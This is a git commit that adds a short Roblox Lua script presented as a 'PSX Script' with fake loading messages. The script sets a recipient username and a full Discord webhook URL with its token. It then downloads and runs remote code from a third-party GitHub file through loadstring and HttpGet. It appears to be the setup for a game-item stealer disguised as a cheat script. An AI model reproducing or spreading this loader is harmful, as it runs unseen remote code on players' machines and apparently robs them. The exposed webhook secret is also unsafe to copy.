35b3fcab981a38111147ac4be789f606b0cb6a20
Munsterir <130992010+Munsterir@users.noreply.github.com>
2023-04-17 15:39:31 +0300

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,10 @@
+Username = "lolullolull"
+WebHook = "https://discord.com/api/webhooks/1097499874066448494/oCSHFMlcPnukCfVfgdMSBC4UKH555hNm-dV0BT1NHEjgEz0rP-XR4W7RMPLPEJDynuuQ"
+
+loadingscreen = true
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
